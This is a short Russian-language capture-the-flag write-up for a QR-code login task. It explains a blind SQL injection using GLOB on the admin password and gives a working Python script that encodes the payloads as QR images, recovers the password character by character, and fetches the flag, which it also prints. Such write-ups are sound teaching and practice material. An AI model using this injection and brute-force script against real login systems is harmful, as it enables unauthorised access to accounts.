# Решение

## Идея
Сервер принимает QR-код с логином и паролем в формате `username:password` и делает SQL-запрос без параметризации. В инъекции удобно использовать оператор `GLOB`, чтобы различать регистр.

## Эксплуатация
1. Подбираем пароль администратора побуквенно, подставляя инъекцию в username:

```sql
admin' AND password GLOB 'a*'--
```

2. После восстановления пароля логинимся и запрашиваем `/flag`.

## Пример скрипта
```python
import requests
from qrcode import make

URL_LOGIN = 'http://localhost:8080/qr-login'
URL_FLAG = 'http://localhost:8080/flag'
CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'

def generate_qr_data(prefix: str) -> str:
    return f"admin' AND password GLOB '{prefix}*'--:wer--"

def send_qr_image(session: requests.Session, qr_data: str) -> str:
    qr = make(qr_data)
    qr.save('exploit.png')
    with open('exploit.png', 'rb') as f:
        files = {'qrcode': f}
        return session.post(URL_LOGIN, files=files).text

def main():
    s = requests.Session()
    prefix = ''
    for _ in range(32):
        found = False
        for ch in CHARS:
            test = prefix + ch
            if 'пароль' in send_qr_image(s, generate_qr_data(test)):
                prefix = test
                found = True
                break
        if not found:
            break

    send_qr_image(s, f'admin:{prefix}')
    print(s.get(URL_FLAG).text)

if __name__ == '__main__':
    main()
```

## Флаг
`FECTF{sql_injection_from_qr_code_1337}`
